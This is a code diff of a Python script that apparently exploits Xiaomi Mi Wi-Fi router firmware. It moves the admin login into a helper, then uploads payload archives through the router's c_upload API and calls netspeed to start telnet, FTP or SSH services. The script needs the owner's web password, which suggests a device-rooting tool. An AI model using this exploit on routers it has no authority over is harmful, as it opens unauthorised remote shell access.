@@ -44,23 +44,7 @@ print("mac = {}".format(gw.mac_address))
 if gw.ping(verbose = 0) is True:
   die(0, "Exploit already installed and running")
 
-if not gw.nonce_key or not gw.mac_address:
-  die("Xiaomi Mi Wi-Fi device is wrong model or not the stock firmware in it.")
-
-nonce = "0_" + gw.mac_address + "_" + str(int(time.time())) + "_" + str(random.randint(1000, 10000))
-password = input("Enter device WEB password: ")
-account_str = (password + gw.nonce_key).encode('utf-8')
-account_str = hashlib.sha1(account_str).hexdigest()
-password = (nonce + account_str).encode('utf-8')
-password = hashlib.sha1(password).hexdigest()
-username = 'admin'
-data = "username={username}&password={password}&logtype=2&nonce={nonce}".format(username = username, password = password, nonce = nonce)
-requrl = "http://{ip_addr}/cgi-bin/luci/api/xqsystem/login".format(ip_addr = ip_addr)
-r1 = requests.post(requrl, data = data, headers = get_http_headers())
-try:
-  stok = re.findall(r'"token":"(.*?)"',r1.text)[0]
-except Exception:
-  die("Password is not correct!")
+stok = gw.web_login()
 
 dn_tmp = 'tmp/'
 if gw.use_ssh:
@@ -147,14 +131,13 @@ if tgz_size2 > 100*1024 - 128:
   die("File size {} exceeds 100KiB".format(fn_payload2)) 
 
 print("Start uploading the exploit with payload...")
-urlapi = "http://{ip_addr}/cgi-bin/luci/;stok={stok}/api/".format(ip_addr = ip_addr, stok = stok)
 
 if (fn_payload1):
-  requests.post(urlapi + "misystem/c_upload", files={"image":open(fn_payload1, 'rb')})
+  requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload1, 'rb')})
 if (fn_payload2):
-  requests.post(urlapi + "misystem/c_upload", files={"image":open(fn_payload2, 'rb')})
+  requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload2, 'rb')})
 if (fn_payload3):
-  requests.post(urlapi + "misystem/c_upload", files={"image":open(fn_payload3, 'rb')})
+  requests.post(gw.apiurl + "misystem/c_upload", files={"image":open(fn_payload3, 'rb')})
 
 time.sleep(1)
 
@@ -163,7 +146,7 @@ if gw.use_ssh:
 else:
   print("Running TELNET and FTP servers...")
 
-requests.get(urlapi + "xqnetdetect/netspeed")
+requests.get(gw.apiurl + "xqnetdetect/netspeed")
 
 time.sleep(0.5)
 gw.ping()
